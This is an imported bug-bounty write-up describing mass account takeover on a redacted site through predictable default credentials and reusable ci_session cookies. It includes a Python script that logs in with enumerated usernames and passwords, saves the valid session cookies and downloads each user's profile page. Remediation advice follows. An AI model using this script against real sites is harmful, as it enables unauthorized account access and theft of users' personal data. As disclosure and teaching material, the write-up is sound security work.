---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-04-22_how-careless-default-credentials-impact-to-massive-account-takeover.md
original_filename: 2023-04-22_how-careless-default-credentials-impact-to-massive-account-takeover.md
title: How careless default credentials impact to massive account takeover
category: documents
detected_topics:
- rate-limit
- jwt
- idor
- command-injection
- otp
- csrf
tags:
- imported
- documents
- rate-limit
- jwt
- idor
- command-injection
- otp
- csrf
language: en
raw_sha256: bbf9d075c7db07fcdb7c31e176b93d72671149d318a4d646e15580b06d7ebe20
text_sha256: f4495326632a39f0c976d2ba597954633bec26a0509fec950088a5c4de98cf71
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: true
---

# How careless default credentials impact to massive account takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-04-22_how-careless-default-credentials-impact-to-massive-account-takeover.md
- Source Type: markdown
- Detected Topics: rate-limit, jwt, idor, command-injection, otp, csrf
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: True
- Raw SHA256: `bbf9d075c7db07fcdb7c31e176b93d72671149d318a4d646e15580b06d7ebe20`
- Text SHA256: `f4495326632a39f0c976d2ba597954633bec26a0509fec950088a5c4de98cf71`


## Content

---
title: "How careless default credentials impact to massive account takeover"
url: "https://medium.com/@mmaulanaabdullah/how-careless-default-credentials-impact-to-massive-account-takeover-be6bfc85119a"
authors: ["M Maulana Abdullah"]
bugs: ["Authentication bypass", "Account takeover", "Weak credentials"]
publication_date: "2023-04-22"
added_date: "2023-04-24"
source: "pentester.land/writeups.json"
original_index: 1230
scraped_via: "browseros"
---

# How careless default credentials impact to massive account takeover

How careless default credentials impact to massive account takeover
M Maulana Abdullah
Follow
4 min read
·
Apr 22, 2023

15

Have you ever registered on a website (lets call it as redacted.com) which right after, you will get default credentials through email / whatsapp / sms ?Most importantly, after login to redacted.com, there is no direct challenge to update the default password as mandatory prerequisite to continue accessing web pages. At this case, one of user obtains 2324900030 and aadc23240030 as username and password respectively.

Quick disclaimer: don’t do any harm against applications unless you have permission. This is meant for educational purpose only and share you the technique so that you can perform them against your own application(s) that you have permissions for.

1. Guess what is information inside the username
Press enter or click to view image in full size
Press enter or click to view image in full size

In short, the username represents of registration year, registration type, and registration sequence number.

2. Correlation between username and password
Press enter or click to view image in full size

By default the password consists of first ‘aadc’ static character merged with registration year, and registration sequence number. At this case, registration type is not in password information.

3. Intercept on how login process is actually ongoing
Press enter or click to view image in full size

According to the request response above, it’s observed that:

Server identifies the successful validation by giving 200 http code response and 0 content-length
Server will put ci_session as cookie for valid identifier

To prove this hypothesis, open browser with clear cookies or might go with incognito, inject the ci_session as cookie and continue to sign in.

Press enter or click to view image in full size

Bingo, user would be redirected as response instruction at refresh header response.

Press enter or click to view image in full size
4. Massive account take over ?

You might notice that username consist of well pattern information and this could be easily enumarated with possible number.

Get M Maulana Abdullah’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

A. Possible enumeration of username and password

username:

Press enter or click to view image in full size
xxyy might be 2324, 2223, 2122, etc
zz can be in range of 88 to 92 (please see above 1. information inside the username)
bbbb can be in range of 0001 to you name it

password=***REDACTED*** follow its convertion patter ‘aadc’+xxyy+bbbb

B. Construct Automatic Login to Collect CI_Session Cookie

Assume you already have all enumerated users at enumeratedUser.txt and enumeratedPassword to enumeratedPwd.txt. Here is simple code snippet written in Python to collect all valid CI_Session cookie and resulting userProfile information.

import requests, pickle
url = ‘http://redacted.com/login'
urlProfile = ‘http://redacted.com/user'

# Using readline()
file1 = open(‘enumeratedUser.txt’, ‘r’)
file2 = open(‘enumeratedPwd.txt’, ‘r’)
file3 = open(‘outputCookies.txt’,’w’)

count = 0
# Strips the newline character
while True:
count += 1

# Get next line from file
lineUser = file1.readline()
linePwd=***REDACTED***

# if line is empty
# end of file is reached
if not lineUser:
break

# requesting to url
user = lineUser.strip()
pwd=***REDACTED***
myobj = {‘userid’: user, ‘pass’: pwd, ‘login’: ‘login’}
x = requests.post(url, data = myobj)

# checking if content length header > 0 then getting the cookies
headersResp = x.headers;
contentLength = headersResp[‘Content-Length’]

if int(contentLength) == 0:
cookie = x.cookies.get_dict()
print(“LineUser{}: {}”.format(count, user))
print(“LinePwd{}: {}”.format(count, pwd))

# writing to file
file3.write(str(cookie))
file3.write(‘\n’)

userProfilePage = requests.get(urlProfile, cookies=cookie)
fileX = open(str(user)+”.html”,’w’)
print(str(userProfilePage.content))
fileX.write(str(userProfilePage.content))
fileX.close()

file1.close()
file2.close()
file3.close()

5. To avoid account takeover happen

Redacted.com should undertake the following list-to-do to avoid their user’s account to be taken over

To have csrf token login with proper implementation or captcha at login form with proper implementation
To strengthen password information with random and complex combination of characters, numbers
To have a JWT token as part of authentication cookie parameter as a result of trusted login process
To have web application firewall which might potentially detect some brute force action.
